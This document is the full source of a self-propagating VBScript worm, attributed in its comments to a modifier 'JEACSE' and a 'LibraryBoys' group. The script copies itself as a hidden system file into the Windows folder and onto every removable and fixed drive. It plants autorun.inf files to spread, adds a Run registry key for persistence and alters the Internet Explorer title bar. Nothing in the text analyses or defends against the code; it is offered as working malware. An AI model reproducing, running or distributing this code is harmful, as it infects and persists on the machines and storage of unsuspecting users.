'THIS IS A MODIFIED VERSION BY: JEACSE
'MABUHAY ANG LibraryBoys
on error resume next
dim mysource,winpath,flashdrive,LibraryBoys,mf,atr,tf,rg,nt,check,sd
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe LibraryBoys6519.dll.vbs"
set LibraryBoys = createobject("Scripting.FileSystemObject")
set mf = LibraryBoys.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text=mf.openastextstream(1,-2)
do while not text.atendofstream
mysource=mysource&text.readline
mysource=mysource & vbcrlf
loop
do
Set winpath = LibraryBoys.getspecialfolder(0)
set tf = LibraryBoys.getfile(winpath & "\LibraryBoys6519.dll.vbs")
tf.attributes = 32
set tf=LibraryBoys.createtextfile(winpath & "\LibraryBoys6519.dll.vbs",2,true)
tf.write mysource
tf.close
set tf = LibraryBoys.getfile(winpath & "\LibraryBoys6519.dll.vbs")
tf.attributes = 39
for each flashdrive in LibraryBoys.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then
set tf=LibraryBoys.getfile(flashdrive.path &"\LibraryBoys6519.dll.vbs")
tf.attributes =32
set tf=LibraryBoys.createtextfile(flashdrive.path &"\LibraryBoys6519.dll.vbs",2,true)
tf.write mysource
tf.close
set tf=LibraryBoys.getfile(flashdrive.path &"\LibraryBoys6519.dll.vbs")
tf.attributes =39
set tf =LibraryBoys.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=LibraryBoys.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write atr
tf.close
set tf =LibraryBoys.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
next
set rg = createobject("WScript.Shell")
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LibraryBoys6519",winpath&"\LibraryBoys6519.dll.vbs"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Mga LibraryBoys ARE!"
if check <> 1 then
Wscript.sleep 200000
end if
loop while check<>1
set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
